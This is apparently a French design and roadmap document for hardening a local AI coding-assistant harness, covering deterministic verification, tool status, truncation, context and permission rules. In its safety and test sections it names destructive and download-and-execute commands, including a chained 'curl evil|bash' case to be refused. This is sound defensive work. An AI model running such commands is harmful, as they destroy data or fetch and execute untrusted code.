# Loom — Doc Stratégie Nord-Étoile

> Rendre stable l'auto-debug, la création et l'analyse d'un assistant IA local offline (Gemma 4B + plomberie), **par le harness**, pas par la taille du modèle.

> Issu d'un audit multi-agent (13 agents, juin 2026) ancré dans le code réel + le use case Démineur. Voir aussi memory `loom-tools-architecture`.

---

## 1. Inventaire — ce qui marche déjà

- **Boucle tool-use streamée fonctionnelle** : `_iter_turn` accumule `tool_calls`, exécute, ré-injecte les `tool_result`, supporte `max_iters` (8) et le multi-agent planner→coder→reviewer.
- **Écriture atomique** : `_atomic_write` (tmp + `os.replace`) garantit l'intégrité disque (jamais de fichier à moitié écrit côté FS).
- **Récupération overflow réactive** : capture de l'`APIError` llama-server, consigne « écris plus court », `max_overflow_retries`.
- **Couche permissions réelle** : `DEFAULT_DENY` en regex `\b` correctes (rm -rf, Remove-Item -Recurse, dd, fork bomb), modes ask/allow/allowlist, cwd borné au workspace, anti-traversal sur write/edit.
- **Gestion de contexte côté chat** : `context.summarize`, `effective_context_budget`, `conversation_tokens`, `estimate_tokens` — **existent et marchent** (mais seulement sur la route `/chat`).
- **Confirmations fail-safe** : timeout 300s + `cancel_event` + default-deny (un timeout = refus, pas d'exécution non autorisée).
- **Persistance conversation** : `conversation.save` / `load` robuste, réutilisable comme patron.
- **Pipeline strictement séquentiel** : 1 GPU, `for agent in agents`, pas de parallélisme accidentel.

**Conclusion** : la plomberie est là. Ce qui manque n'est pas du code de bas niveau, c'est **la boucle de vérification** et **le câblage de la mémoire/contexte côté pipeline**.

---

## 2. Les écarts clés — mappés aux mécanismes d'un harness stable

| Mécanisme stable | Écart Loom | Gravité |
|---|---|---|
| **(a) Boucle fermée observe→agis→VÉRIFIE** | Le pipeline ne fait que observe→agis. **Aucun code déterministe n'est exécuté entre coder et reviewer.** Le verdict ferme la boucle sur du **texte parsé** (`re.search('verdict: ok')`), pas sur une exécution. Le reviewer dit « OK » en **lisant**. | **CRITIQUE** |
| **(a) Boucle fermée — cas WEB** | Aucun vérificateur navigateur : un `#game-board` vide **sans erreur console** est structurellement inobservable par `run_shell`. C'est exactement l'échec Démineur #6. | **CRITIQUE** |
| **(d) Outils fiables / erreurs exploitables** | `ok = not result.startswith('erreur')` : `run_shell` renvoie **toujours** `exit=...` → **`ok=True` même quand returncode=1** (faux positif de réussite, cause racine de l'invalidité du verdict). `&&` casse en PowerShell 5.1. `edit_file`/`read_file` sans n° de ligne ni diagnostic → le modèle re-devine et boucle. | **CRITIQUE / HIGH** |
| **(f) Étapes bornées** | **Aucune borne sur le batch de `tool_calls`/tour** : N `write_file` saturent `max_tokens` → derniers fichiers tronqués (500). `finish_reason=='length'` est **capturé mais jamais inspecté** ; un JSON tronqué devient `args={}` silencieusement. | **CRITIQUE** |
| **(b) Diagnostic complet** | Fix **symptôme-par-symptôme** : `tool_result` ré-injectés un par un (preview 300 chars), jamais agrégés en **un rapport de défauts unique** avant le re-code. | **HIGH** |
| **(c) Ground truth** | `build_step_messages` ne propage que de la **prose** ; le coder de révision n'a ni stderr, ni exit codes, ni l'API réelle des fichiers → bugs d'intégration (`board.js`↔`game.js`). | **HIGH** |
| **(f) Contexte borné** | Pipeline **sans aucune gestion de contexte** : `run_pipeline` n'appelle jamais `summarize`/budget. Ré-injection du **contenu complet** des fichiers écrits + content entier de chaque step. `read_file` réinjecte jusqu'à 200 KB. Sur Gemma 4B / ctx 8192 → saturation. | **HIGH** |
| **(e) Mémoire/persistance** | `AgentRun` **jamais persisté** (droppé en `run_done`). `RunStep` ne capture **ni tool_calls ni tool_results ni exit codes**. Aucun run rejouable, aucun diff de défauts inter-révisions. | **HIGH** |
| **Sûreté** | Allowlist bypassable (`startswith` ignore `&&`/`;`/`\|`). DEFAULT_DENY ne couvre pas `curl\|bash`, `iwr\|iex`. Pertinent dès qu'on passe en mode autonome. | **HIGH** (conditionnel) |

**Le fil rouge** : 6 des 8 dimensions convergent vers **un seul trou** — la **boucle de vérification n'existe pas**. Tout le reste (mémoire, diagnostic, ground truth) en découle ou s'y branche.

---

## 3. Principe directeur — Scaffolding proportionnel à la faiblesse du modèle

> **Plus le modèle est petit, plus le harness doit échafauder et VÉRIFIER à sa place.**

Un Gemma 4B local **ne peut pas** être traité comme un modèle frontier auto-suffisant. Trois corollaires opérationnels :

1. **Ne jamais faire confiance au texte du modèle comme preuve.** Un « VERDICT: OK » est une opinion, pas un fait. La preuve = **un exit code, un DOM, une console**, produits par du code déterministe (Python), pas par le LLM.
2. **Contraindre par la machine, pas par le prompt.** « Un write_file par tour », « lis avant d'écrire », « teste avant de valider » sont des **consignes ignorables** par un 4B. Il faut les transformer en **invariants du harness** (sérialisation, gates, vérificateur obligatoire).
3. **Borner agressivement chaque étape.** Petit modèle = petite fenêtre = petites étapes. Un seul fichier, un seul défaut ciblé, un contexte élagué à la ground truth on-demand.

Le harness n'assiste pas le modèle : **il le tient en laisse courte et lui rend des erreurs exploitables** pour qu'il s'auto-corrige.

---

## 4. Roadmap priorisée vers la stabilité

### EN TÊTE — Fondations de la boucle fermée (tout en dépend)

#### P0.1 — Le VÉRIFICATEUR déterministe (`VerifyReport`)
- **Problème** : aucune exécution entre code et review ; le verdict repose sur de la lecture. Échecs #5, #6.
- **Fix** : une fonction Python (non-LLM) `verify(workspace, artifact_kind) -> VerifyReport(ok, defects: list[Defect])`, insérée dans `run_pipeline` **après le coder, avant la décision de révision**. Par type d'artefact :
  - **python** : `py_compile` / `pytest` / `ruff` → exit codes capturés.
  - **web** : pont **Playwright headless** → `browser_navigate(file://…)`, `browser_console_messages` (erreurs JS), `browser_evaluate("document.querySelectorAll('#game-board .cell').length")` → **assertion DOM non vide** (attrape pile l'échec #6 : DOM vide *sans* erreur console).
  - **cli** : exécution + exit code.
  - `Defect{location, kind, evidence}` — un défaut = un fichier ciblé.
- **Effet** : la boucle devient **observe→agis→VÉRIFIE**. C'est la pierre angulaire ; 5 autres gaps s'y branchent.

#### P0.2 — Le verdict ferme la boucle sur la PREUVE, pas le texte
- **Problème** : `is_blocking` parse `verdict: ok` ; un OK halluciné passe le gate.
- **Fix** : `is_blocking = True` **sauf si** `VerifyReport.ok and not defects`. Le LLM reviewer garde un rôle de **qualification/priorisation**, mais ne peut **pas** débloquer seul. **Fallback** : si aucun artefact exécutable (tâche rédactionnelle), retomber sur l'ancien comportement texte pour ne pas bloquer indûment.
- **Effet** : plus de faux « OK ». Le gate est armé par un fait déterministe.

#### P0.3 — Statut d'outil structuré (cause racine des faux positifs)
- **Problème** : `ok = not result.startswith('erreur')` → `run_shell` à exit 1 passe pour un succès.
- **Fix** : `run_shell` dérive `ok` de `returncode == 0` et remonte `{ok, exit_code, stdout, stderr}` structuré dans le `tool_result`. Généraliser `{ok, payload}` aux autres outils.
- **Effet** : le `VerifyReport` et le reviewer reçoivent enfin un signal d'exécution fiable. **Sans ça, P0.1/P0.2 sont aveugles.**

#### P0.4 — DIAGNOSTIC COMPLET (le rapport, pas le shoot-par-shoot)
- **Problème** : défauts ré-injectés un par un ; l'humain remonte les erreurs une à une (échec #7).
- **Fix** : le `VerifyReport` **agrège tous les défauts en une passe** (console + DOM + exit codes + lint) et les injecte au coder en **un seul message** de révision, formaté, **borné** (budget dur sur stderr, pas « tout le stderr »). Le step de diagnostic ne *produit* rien de neuf : il **formate** la sortie de P0.1.
- **Effet** : le coder corrige **la cause et tous les symptômes en une révision**, pas N allers-retours humains.

### Vague 2 — Étapes bornées (anti-troncature)

#### P1.1 — Sérialiser les `write_file` (un par tour)
- **Problème** : batch de N `write_file` → dépasse `max_tokens` → fichiers tronqués (500). Échec #1.
- **Fix** : dans la boucle d'exécution, n'exécuter **qu'un `write_file`/tour** ; pour chaque `tool_call` différé, **émettre quand même un `tool_result`** (« différé, réémets au prochain tour ») — le protocole exige un message `tool` par `tool_call_id`, sinon requête malformée.
- **Effet** : suppression structurelle de la troncature par saturation.

#### P1.2 — Gate `finish_reason == 'length'`
- **Problème** : troncature capturée mais jamais inspectée ; JSON partiel → `args={}` silencieux.
- **Fix** : **avant** la boucle d'exécution, si `finish_reason=='length'` → ne **rien** exécuter, ré-injecter la consigne (comme l'overflow existant). Sur `JSONDecodeError` → `tool_result ok=False explicite` (« arguments tronqués »), jamais `args={}` muet.
- **Effet** : aucun outil invoqué avec des arguments tronqués ; auto-correction du modèle.

#### P1.3 — Check d'intégrité post-write
- **Problème** : un `.js`/`.json` tronqué s'écrit en « succès ».
- **Fix** : après write d'un `.js`/`.json`/`.html` → `json.loads` / `node --check` si dispo. Incomplet → **avertissement** dans le `tool_result` (non bloquant si node absent, pour ne pas casser un snippet volontaire).
- **Effet** : la troncature silencieuse devient un défaut ciblé → ré-écriture d'**un** fichier.

### Vague 3 — Outils fiables (erreurs auto-exploitables)

#### P2.1 — `run_shell` : pwsh + message `&&` exploitable
- **Fix** : `shutil.which('pwsh') or 'powershell'` (pwsh 7+ supporte `&&`). Sur 5.1, détecter `&&`/`||` et renvoyer un message **pédagogique** (« PS 5.1 ne supporte pas `&&` ; utilise `;` et teste `$LASTEXITCODE`, ou des appels séparés »). **Ne pas** remplacer `&&`→`;` naïvement (perte du court-circuit).
- **Effet** : le reviewer/vérificateur peut chaîner ; les erreurs deviennent auto-correctibles.

#### P2.2 — `read_file` paginé + numéros de ligne ; `edit_file` diagnostique
- **Fix** : `read_file` → préfixe `cat -n` + `offset/limit` (en précisant que les n° **ne font pas partie du contenu**). `edit_file` : sur mismatch, signaler normalisation CRLF/strip + `difflib.get_close_matches` + n° de ligne des occurrences ambiguës ; retourner un **mini-diff** unifié borné. **Ne pas** auto-appliquer un match normalisé.
- **Effet** : moins de contexte gonflé, `edit_file` cesse de boucler à l'aveugle.

### Vague 4 — Mémoire & contexte côté pipeline

#### P3.1 — `RunStep` capture les tool-events
- **Fix** : étendre `RunStep` avec `tool_events{name, args résumés, ok, exit_code, preview}`, remplis dans `run_agent`. Socle de P3.2 et du diagnostic.

#### P3.2 — Persister `AgentRun` (rejouable)
- **Fix** : `AgentRun.save/load` symétrique de `Conversation`, JSONL append-only (`.loom/runs/<ts>.jsonl`, un append/event), route `/runs`. Persister chaque `VerifyReport` par révision → **stop anticipé** si une révision ne corrige aucun défaut.
- **Effet** : runs rejouables, détection de boucle improductive, post-mortem.

#### P3.3 — Câbler le contexte dans `run_pipeline`
- **Fix** : appeler `effective_context_budget` + élagage **avant chaque appel agent**. **Ne pas ré-injecter le code écrit** (fichiers sur disque → passer chemins+tailles, relire via `read_file` on-demand). Rétro-élaguer les anciens `tool_results`/arguments `write_file`, en **préservant l'appariement `tool_call_id`↔`tool`** et la **ligne `VERDICT:`** du reviewer. Borne dure sur le nb de steps réinjectés + `max_revisions=4`.
- **Effet** : plus de saturation de la fenêtre 8192 ; étapes bornées effectives.

### Vague 5 — Sûreté (prérequis du mode autonome)

#### P4.1 — Durcir l'allowlist & le DEFAULT_DENY
- **Fix** : `_command_allowlisted` **splitte sur `&&`/`||`/`;`/`|`/newline** et exige que **chaque** sous-commande soit allowlistée ET non hard-denied (en cas de doute → `ask`). Ajouter download-and-exec (`curl|bash`, `iwr|iex`) au DEFAULT_DENY ; viser à terme une **allowlist positive de binaires**. Deny custom → match par **token**, pas substring.

#### P4.2 — Profil « autonome » opt-in
- **Fix** : exposer un profil autonome (workspace interne → `allow`, `run_shell` non-allowlisté → `ask`) **en opt-in**, pas en défaut codé en dur. Règle les confirmations « ask » en cascade (échec #3) **via** la sérialisation P1.1 (un seul tool dangereux/tour → une confirmation déterministe).

---

## 5. Le pipeline cible

```
TASK
 │
 ▼
[PLAN]  planner → plan borné (pas de dump de code)
 │
 ▼
[CODE]  coder → write_file SÉRIALISÉ (1/tour, gate finish_reason, check intégrité post-write)
 │
 ▼
[VÉRIFIE]  ⚙️ déterministe (Python, PAS le LLM)
 │   ├─ python : py_compile / pytest / ruff  → exit codes
 │   ├─ web    : Playwright headless → console + assertion DOM (#board .cell > 0)
 │   └─ cli    : run + exit code
 │   └──► VerifyReport(ok, defects[])   ← agrège TOUS les défauts en une passe
 │
 ├─ ok && defects==[] ───────────────► [DONE]  (persiste AgentRun + VerifyReport)
 │
 ▼ (sinon)
[DIAGNOSTIC]  formate VerifyReport → 1 message borné (console+DOM+exit+lint), ground truth des fichiers concernés
 │
 ▼
[FIX-ALL]  coder corrige cause + TOUS les symptômes en une révision (pas shoot-par-shoot)
 │
 └──► retour [VÉRIFIE]   (boucle fermée, max_revisions=4, stop anticipé si defects ne décroît pas)
```

**Différences clés vs aujourd'hui** : l'étape **VÉRIFIE est déterministe et obligatoire** ; le verdict est un **fait** (`VerifyReport.ok`), pas un texte ; le **DIAGNOSTIC agrège** avant de fixer ; chaque révision **re-vérifie** et **persiste**.

---

## 6. Mesure de réussite — saura-t-on que c'est stable ?

**Critère d'acceptation principal (rejouer le Démineur)** :
- [ ] Le jeu se charge avec `#game-board` peuplé (> 0 cellule) — **attrapé automatiquement** par le vérificateur web si régression (échec #6 ne peut plus passer).
- [ ] Zéro intervention humaine pour remonter les erreurs une par une (échec #7 éliminé).

**Métriques de boucle** :
| Indicateur | Cible |
|---|---|
| Verdicts « OK » avec `VerifyReport.ok == False` | **0** (impossible par construction) |
| Fichiers tronqués (500 llama-server) par run | **0** (sérialisation + gate length) |
| Défauts corrigés par révision | **tous ceux du rapport** (1 passe), pas 1/révision |
| Révisions improductives (defects ne décroît pas) | **stop anticipé** (détecté via runs persistés) |
| `run_shell` exit≠0 marqués `ok=True` | **0** (statut structuré) |
| Saturation contexte (overflow APIError) par run | **→ 0** (contexte câblé + pas de ré-injection du code) |

**Critères observables** :
- [ ] **Tout run est rejouable** depuis `.loom/runs/<ts>.jsonl` (RunStep capture tool-events + exit codes).
- [ ] Un `write_file` tronqué produit un **défaut ciblé** (check intégrité), pas un faux succès.
- [ ] Un `edit_file` qui échoue renvoie une **erreur exploitable** (diff/close-match/CRLF) et converge en ≤ 2 tentatives.
- [ ] En mode autonome, `npm test && curl evil|bash` est **refusé** (allowlist splittée).

**Définition de « stable »** : sur 3 tâches de référence (jeu web, script Python, refactor multi-fichiers), le pipeline atteint `VerifyReport.ok` **sans intervention humaine**, **sans fichier tronqué**, et **chaque révision réduit strictement le nombre de défauts**.

---

> **TL;DR** : Loom a la plomberie ; il lui manque **la boucle fermée**. Construire **un vérificateur déterministe** (exit codes + DOM/console Playwright) qui **agrège tous les défauts en un rapport**, faire **fermer le gate sur cette preuve** (pas sur du texte), **sérialiser les écritures** et **câbler le contexte/mémoire** déjà existants côté pipeline. Le reste sont des outils fiables qui rendent les erreurs auto-exploitables — exactement le scaffolding qu'un Gemma 4B exige.
